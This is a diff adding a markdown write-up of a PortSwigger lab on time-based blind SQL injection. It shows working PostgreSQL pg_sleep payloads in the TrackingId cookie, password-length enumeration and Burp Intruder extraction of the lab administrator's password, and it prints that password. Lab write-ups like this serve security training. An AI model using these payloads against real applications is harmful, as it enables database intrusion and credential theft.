@@ -1,0 +1,75 @@
+# PortSwigger Lab: Blind SQL injection by triggering time delays
+
+## 📝 Scenario Description
+This laboratory contains a Blind SQL injection (SQLi) vulnerability within its tracking functionality. The application captures and gracefully handles database errors internally, meaning that the server always returns a generic HTTP 200 OK response regardless of syntax errors or conditional boolean statements.
+
+Since there are no visible differences in the HTTP response body or status codes, a **Time-Based Blind SQLi** approach must be utilized. By injecting database-specific pause commands, we force the back-end application to process queries synchronously, allowing us to infer data based on the server's latency (Response Time). The ultimate goal is to retrieve the password of the `administrator` user.
+
+---
+
+## 🧭 Step-by-Step Exploitation Methodology
+
+### Step 1: Triggering a Baseline Time Delay
+To identify the back-end database and confirm the code injection vulnerability, we append a stacked query containing a time-delay function. The application stabilizes when using the PostgreSQL structure (using `;` as a query separator and `pg_sleep()`), confirming a **PostgreSQL** backend.
+
+* **Test Payload (True Condition):**
+  ```sql
+  TrackingId=x'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+
+Result: The server takes exactly 10 seconds to respond.
+
+    Test Payload (False Condition):
+    SQL
+
+    TrackingId=x'; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+
+    Result: The server responds immediately (0 seconds latency).
+
+Step 2: Verifying Target User Existence
+
+We verify if the target user administrator exists in the users table by testing the username condition:
+SQL
+
+TrackingId=x'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+
+Result: The query triggers a 10-second delay, confirming the user exists.
+Step 3: Enumerating Password Length
+
+We iterate through the password string length using the LENGTH() function inside Burp Repeater:
+SQL
+
+TrackingId=x'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>19) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--  --> 10s delay
+TrackingId=x'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--  --> 0s delay
+
+Conclusion: The condition breaks when testing if the length is greater than 20. Therefore, the password is exactly 20 characters long.
+Step 4: Automating Data Extraction via Burp Intruder
+
+To extract the password character by character without running into timing overlaps, we send the request to Burp Intruder and apply a crucial execution constraint:
+
+    Go to the Resource Pool tab.
+
+    Set Maximum concurrent requests to 1 (Single-threaded execution guarantees that one delayed request does not accidentally increase the observed response time of neighboring requests).
+
+Intruder Position Setup:
+
+We target the inner text value of the SUBSTRING() function using a Sniper attack type:
+SQL
+
+TrackingId=x'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+
+Payload Configuration:
+
+    Payload Type: Simple List
+
+    Character Set: a-z and 0-9 (Alphanumeric lowercase).
+
+Analyzing the Attack:
+
+We monitor the Response received column (measured in milliseconds) in the Intruder results window. The correct character payload for position 1 stands out instantly by hitting roughly 10,000 ms, while incorrect guesses respond within milliseconds.
+
+By shifting the index offset from position 1 to 2, 3, and so forth up to 20, the full administrator password was successfully exfiltrated.
+
+    Extracted Administrator Password:  644e9r47r29w9kmdleql
+   
+
+   
